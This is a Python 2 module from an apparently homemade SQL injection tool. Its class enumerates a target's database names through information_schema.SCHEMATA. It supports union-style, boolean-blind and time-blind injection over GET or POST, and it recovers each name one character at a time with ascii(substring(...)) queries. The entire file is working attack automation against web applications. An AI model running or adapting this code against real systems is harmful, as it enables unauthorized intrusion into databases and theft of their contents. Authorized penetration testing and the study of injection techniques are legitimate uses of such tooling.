#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib.log import logger
from test import SqliTest
from tqdm import trange
from lib.dealpayload import build_injection
from lib.dealpayload import time_injection
from lib.dealpayload import normal_injection

__author__ = "LoRexxar"


# 居然忘记了database也要注...


class SqliDatabases(SqliTest):
    def __init__(self):
        SqliTest.__init__(self)
        if self.len == 0:
            SqliTest.test(self, output=0)

    def get_database(self):

        if self.sqlirequest == "GET":
            logger.debug("The sqlirequest is %s, start sqli databases..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")
                # 先注databases的数量

                databases_number = normal_injection(select='COUNT(SCHEMA_NAME)',
                                                    source='information_schema.SCHEMATA',
                                                    dealpayload=self.dealpayload,
                                                    data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                    )

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                # 每个循环跑一次databases的数据
                for i in trange(int(databases_number), desc="Database sqli...", leave=False, disable=True):
                    # 首先是database name的长度
                    logger.debug("Start %dth database length sqli..." % (i + 1))

                    databases_name_len = normal_injection(select='length(SCHEMA_NAME)',
                                                          source='information_schema.SCHEMATA',
                                                          limit=i,
                                                          dealpayload=self.dealpayload,
                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                          )

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注database name
                    logger.debug("Start %dth database name sqli..." % (i + 1))

                    databases_name = normal_injection(select='SCHEMA_NAME',
                                                      source='information_schema.SCHEMATA', limit=i,
                                                      dealpayload=self.dealpayload,
                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
                                                      )

                    logger.debug(
                        "%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                retVal = build_injection(select="COUNT(SCHEMA_NAME)",
                                         source="information_schema.SCHEMATA",
                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                         isCount=True, sqlirequest=self.sqlirequest)
                databases_number = int(retVal)

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):

                    logger.debug("Start %dth database length sqli..." % (i + 1))
                    # 然后注databases_name 的 length

                    retVal = build_injection(select="length(SCHEMA_NAME)",
                                             source="information_schema.SCHEMATA",
                                             limit=i,
                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                             isCount=True, sqlirequest=self.sqlirequest)
                    databases_name_len = int(retVal)

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空database_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))
                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):

                        retVal = build_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
                                                 source="information_schema.SCHEMATA",
                                                 limit=i,
                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                                 isStrings=True, sqlirequest=self.sqlirequest)
                        databases_name += chr(retVal)

                    logger.debug(
                        "%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                retVal = time_injection(select="COUNT(SCHEMA_NAME)",
                                        source="information_schema.SCHEMATA",
                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                        isCount=True, sqlirequest=self.sqlirequest)
                databases_number = int(retVal)

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):
                    logger.debug("Start %dth database length sqli..." % (i + 1))

                    # 然后注databases_name 的 length

                    retVal = time_injection(select="length(SCHEMA_NAME)",
                                            source="information_schema.SCHEMATA",
                                            limit=i,
                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                            isCount=True, sqlirequest=self.sqlirequest)
                    databases_name_len = int(retVal)

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空databases_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))

                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                        retVal = time_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
                                                source="information_schema.SCHEMATA",
                                                limit=i,
                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                                isStrings=True, sqlirequest=self.sqlirequest)
                        databases_name += chr(retVal)

                    logger.debug(
                        "%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.debug("The sqlirequest is %s, start sqli databases..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                # 先注databases的数量

                databases_number = normal_injection(select='COUNT(SCHEMA_NAME)',
                                                    source='information_schema.SCHEMATA',
                                                    dealpayload=self.dealpayload,
                                                    data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                    )

                logger.debug("Databases account sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                # 每个循环跑一次databases的数据
                for i in trange(int(databases_number), desc="Database sqli...", leave=False, disable=True):
                    # 首先是database name的长度

                    databases_name_len = normal_injection(select='length(SCHEMA_NAME)',
                                                          source='information_schema.SCHEMATA',
                                                          limit=i,
                                                          dealpayload=self.dealpayload,
                                                          data=self.Data, isCount=True, sqlirequest=self.sqlirequest
                                                          )

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注database name
                    logger.debug("Start %dth database name sqli..." % (i + 1))

                    databases_name = normal_injection(select='SCHEMA_NAME',
                                                      source='information_schema.SCHEMATA', limit=i,
                                                      dealpayload=self.dealpayload,
                                                      data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
                                                      )

                    logger.debug(
                        "%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "build":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                retVal = build_injection(select="COUNT(SCHEMA_NAME)",
                                         source="information_schema.SCHEMATA",
                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                         isCount=True, sqlirequest=self.sqlirequest)
                databases_number = int(retVal)

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):

                    # 然后注databases_name 的 length
                    logger.debug("Start %dth database length sqli..." % (i + 1))

                    retVal = build_injection(select="length(SCHEMA_NAME)",
                                             source="information_schema.SCHEMATA",
                                             limit=i,
                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                             isCount=True, sqlirequest=self.sqlirequest)
                    databases_name_len = int(retVal)

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空databases_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))

                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                        retVal = build_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
                                                 source="information_schema.SCHEMATA",
                                                 limit=i,
                                                 dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                                 isStrings=True, sqlirequest=self.sqlirequest)
                        databases_name += chr(retVal)

                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % (
                        (i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

            elif self.sqlimethod == "time":

                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                logger.debug("Start database amount sqli...")

                retVal = time_injection(select="COUNT(SCHEMA_NAME)",
                                        source="information_schema.SCHEMATA",
                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                        isCount=True, sqlirequest=self.sqlirequest)
                databases_number = int(retVal)

                logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                logger.info("[*] databases_number: %d" % databases_number)

                for i in range(0, int(databases_number)):
                    # 然后注databases_number 的length

                    logger.debug("Start %dth database length sqli..." % (i + 1))

                    retVal = time_injection(select="length(SCHEMA_NAME)",
                                            source="information_schema.SCHEMATA",
                                            limit=i,
                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                            isCount=True, sqlirequest=self.sqlirequest)
                    databases_name_len = int(retVal)

                    logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                    logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))

                    # 然后注databases名字
                    # 清空databases_name
                    databases_name = ""
                    logger.debug("Start %dth database sqli..." % (i + 1))

                    for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
                        retVal = time_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
                                                source="information_schema.SCHEMATA",
                                                limit=i,
                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                                isStrings=True, sqlirequest=self.sqlirequest)
                        databases_name += chr(retVal)

                    logger.debug("%dth Databases name sqli success...The databases_name is %s..." % (
                        (i + 1), databases_name))

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)

                    logger.info("[*] %dth databases_name: %s" % ((i + 1), databases_name))

        databases_name = ','.join(self.databases_name)
        print "[*] databases_name list: " + databases_name
